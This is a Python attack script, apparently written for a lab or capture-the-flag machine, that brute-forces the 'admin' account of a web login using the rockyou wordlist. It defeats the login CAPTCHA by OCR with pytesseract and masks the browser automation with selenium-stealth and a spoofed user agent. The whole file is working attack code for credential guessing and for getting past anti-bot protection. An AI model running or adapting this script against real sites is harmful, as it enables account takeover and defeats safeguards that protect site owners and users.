import io
import time
import pytesseract
from PIL import Image, ImageEnhance, ImageFilter

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium_stealth import stealth

machine_ip = "MACHINE_IP"
login_url = f"http://{machine_ip}/"
username = "admin"
rockyou_path = "/usr/share/wordlists/rockyou.txt"

opts = Options()
opts.add_argument("--headless")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--disable-gpu")
opts.add_argument(
    "user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

driver = webdriver.Chrome(options=opts)

stealth(
    driver,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

with open(rockyou_path, "r", encoding="latin-1", errors="ignore") as f:
    password = f.readline().strip()
    tries = 0

    while password and tries < 100:
        print(f"[-] Testing login with: {password} ({tries+1}/100)")
        driver.get(login_url)
        time.sleep(0.5)

        captcha_img = driver.find_element(By.TAG_NAME, "img").screenshot_as_png
        image = Image.open(io.BytesIO(captcha_img)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, "1")

        captcha_text = pytesseract.image_to_string(
            image,
            config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"
        ).strip().replace(" ", "").replace("\n", "").upper()

        driver.find_element(By.ID, "username").send_keys(username)
        driver.find_element(By.ID, "password").send_keys(password)
        driver.find_element(By.ID, "captcha_input").send_keys(captcha_text)
        driver.find_element(By.ID, "login-btn").click()
        time.sleep(0.5)

        if "CAPTCHA incorrect." in driver.page_source:
            print("[-] Wrong captcha, retry same password...")
            continue

        if "error=true" not in driver.current_url:
            print(f"[+] Login successful with password: {password}")
            print(f"[+] URL: {driver.current_url}")
            break

        print("[-] Login failed")
        password = f.readline().strip()
        tries += 1

driver.quit()